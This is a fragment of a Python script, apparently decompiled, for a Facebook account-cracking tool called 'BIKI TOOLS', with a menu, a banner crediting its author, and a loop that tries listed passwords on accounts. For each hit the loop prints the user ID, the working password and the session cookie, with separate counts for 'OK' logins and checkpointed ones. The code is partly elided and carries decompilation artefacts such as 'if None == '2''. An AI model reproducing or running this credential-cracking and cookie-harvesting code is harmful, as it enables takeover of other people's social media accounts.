...
def ud():
    ...
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://m.me/bikiterabap') 
        FD()
        return None
...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-https://www.facebook.com/groups/1763822120458146/?ref=share_group_link ')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/groups/1763822120458146/?ref=share_group_link ')
        return None
    if None == '0':
        os.system('exit')
        return None
...
\033[1;37m================= \33[32;45mBIKI\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mBIKI MAHAMOOD
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m BIKI MAHAMOOD
\033[1;32m     \033[1;35mGITHUB        :\033[1;35m biki404-cyber
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mKG
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mRN\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO BIKI TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(BIKI-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(BIKI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[BIKI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
